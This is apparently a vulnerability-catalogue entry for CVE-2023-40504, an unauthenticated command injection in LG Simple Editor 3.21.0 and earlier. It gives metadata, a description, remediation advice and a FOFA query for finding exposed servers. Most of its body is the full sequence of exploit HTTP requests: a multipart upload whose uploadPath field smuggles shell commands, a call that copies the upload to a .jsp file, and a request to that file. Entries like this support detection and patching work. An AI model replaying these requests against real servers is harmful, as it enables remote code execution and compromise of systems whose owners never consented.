---
layout: post
cve_id: CVE-2023-40504
title: LG Simple Editor <= v3.21.0 - Command Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-40504.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-40504.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary commands with SYSTEM privileges
  through the readVideoInfo method by injecting malicious strings in system calls,
  potentially compromising the entire LG Simple Editor server and connected systems.

  '
remediation: 'Update LG Simple Editor to a version newer than 3.21.0 that properly
  validates user input and prevents command injection in the readVideoInfo method.

  '
reference:
- https://www.zerodayinitiative.com/advisories/ZDI-23-1208/
- https://packetstormsecurity.com/files/180171/LG-Simple-Editor-3.21.0-Command-Injection.html
- https://0day.today/exploit/39719
- https://www.usom.gov.tr/bildirim/tr-24-0417
- https://nvd.nist.gov/vuln/detail/CVE-2023-40504
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-40504
  cwe-id: CWE-78
  epss-score: 0.91198
  epss-percentile: 0.99627
metadata:
  max-request: 1
  verified: true
  vendor: lg
  product: simple_editor
  fofa-query: icon_hash="159985907"
tags:
- cve
- cve2023
- lg
- simple-editor
- intrusive
- rce
- file-upload
- vuln
---

## ðŸ” Vulnerability Description
LG Simple Editor readVideoInfo Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of LG Simple Editor. Authentication is not required to exploit this vulnerability. The specific flaw exists within the readVideoInfo method. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of SYSTEM.


## ðŸŒ HTTP Request
```nohighlight
GET /simpleeditor/common/commonReleaseNotes.do HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /simpleeditor/imageManager/uploadVideo.do HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Connection: close
Content-Length: 652
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Accept-Encoding: gzip

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadVideo"; filename="CzLCQlvi.bmp"

/
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadPath"

/"&cmd&cd ..&cd ..&cd ..&cd server&cd webapps&cd simpleeditor&del CzLCQlvi.bmp&/../"
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFile_x"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFile_width"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploadFile_height"

1
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```nohighlight
POST /simpleeditor/fileSystem/makeDetailContent.do HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5
Connection: close
Content-Length: 92
Accept: application/json
Content-Type: application/json
Accept-Encoding: gzip

{"command":"cp","option":"-f","srcPath":"/CzLCQlvi_original.bmp","destPath":"/CzLCQlvi.jsp"}
```

```nohighlight
GET /simpleeditor/CzLCQlvi.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

